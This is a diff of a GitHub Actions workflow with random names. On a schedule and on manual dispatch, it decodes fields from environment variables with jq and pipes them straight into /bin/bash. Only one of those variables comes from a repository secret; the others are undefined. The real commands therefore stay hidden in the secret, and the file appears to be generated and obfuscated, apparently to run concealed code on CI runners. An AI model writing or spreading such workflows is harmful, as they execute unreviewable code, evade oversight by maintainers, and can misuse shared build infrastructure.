@@ -1,23 +1,38 @@
 name: dongxixue5678
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 2/6 * * *'
-jobs:  # 7932
+    - cron: '39 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: dongxixue5678
         env:
-          c83787: ${{ secrets.c83787 }}
+          gk31616: ${{ secrets.gk31616 }}
         run: |
-          echo $c83787 | jq -r .uf618 | /bin/bash
-          echo $plg840 | jq -r .vod2 | /bin/bash
-          echo $v7419 | jq -r .kgqar7 | /bin/bash
-          echo $snraw53107 | jq -r .bzah486 | /bin/bash
-          echo $oo2 | jq -r .ywq1137 | /bin/bash
-          echo $tdrk372 | jq -r .o347 | /bin/bash
-          echo $efis5390 | jq -r .lh2816 | /bin/bash
-          echo $jsdk5522 | jq -r .htc02508 | /bin/bash
+          echo $gk31616 | jq -r .x4650 | /bin/bash
+          echo $qmwkx5 | jq -r .dpa7 | /bin/bash
+          echo $b85121 | jq -r .mw159 | /bin/bash
+          echo $m28692 | jq -r .pd7 | /bin/bash
+          echo $lyu9968 | jq -r .m874 | /bin/bash
+          echo $fz9 | jq -r .c75689 | /bin/bash
+          echo $robdl09 | jq -r .vuy2359 | /bin/bash
+          echo $c338 | jq -r .qsmgp36 | /bin/bash
+          echo $rqk43526 | jq -r .txgjx581 | /bin/bash
+          echo $ct84539 | jq -r .pr56 | /bin/bash
+          echo $kidij0860 | jq -r .mu58013 | /bin/bash
+          echo $m39 | jq -r .jzhvm579 | /bin/bash
+          echo $q987 | jq -r .jwxug3289 | /bin/bash
+          echo $ou74230 | jq -r .fayek45 | /bin/bash
+          echo $t9 | jq -r .uhyl22 | /bin/bash
+          echo $mxyat059 | jq -r .hvvc3 | /bin/bash
+          echo $nv629 | jq -r .zdxjk0320 | /bin/bash
+          echo $r35 | jq -r .o6 | /bin/bash
+          echo $op637 | jq -r .ddwv52 | /bin/bash
+          echo $b4 | jq -r .p883 | /bin/bash
+          echo $n265 | jq -r .pfez1885 | /bin/bash
 
